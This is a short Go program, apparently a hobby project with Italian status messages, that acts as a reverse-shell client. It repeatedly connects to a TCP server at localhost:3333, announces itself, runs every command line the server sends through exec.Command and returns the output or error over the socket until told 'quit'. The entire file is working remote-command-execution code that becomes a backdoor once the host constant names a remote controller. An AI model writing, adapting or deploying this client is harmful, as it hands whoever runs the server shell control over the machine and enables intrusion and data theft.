package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	CONN_HOST = "localhost:3333"
	CONN_TYPE = "tcp"
	NAME      = "text"
)

func main() {
	for {
		conn, err := net.Dial(CONN_TYPE, CONN_HOST)
		if err != nil {
			fmt.Println("Azzz server down...")
			time.Sleep(3 * time.Second)
			continue
		} else {
			conn.Write(to_byte(NAME))
			fmt.Println("Azzz server connected...")
			for {
				message, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					fmt.Println("Azzz server down...")
					time.Sleep(5 * time.Second)
					break
				}
				if strings.Compare(string(message), "quit\n") == 0 {
					fmt.Println("Esco")
					os.Exit(0)
				}
				fmt.Println(message)
				out, err := exec_cmd(message)
				if err != nil {
					fmt.Println("Errore")
					err_text := fmt.Sprintf("%s", err)
					conn.Write(to_byte(err_text))
				}
				conn.Write(out)
			}
		}

	}

}

func exec_cmd(command string) ([]byte, error) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:len(parts)]
	out, err := exec.Command(head, parts...).Output()
	return out, err
}

func to_byte(f string, args ...interface{}) []byte {
	return []byte(fmt.Sprintf(f, args...))
}
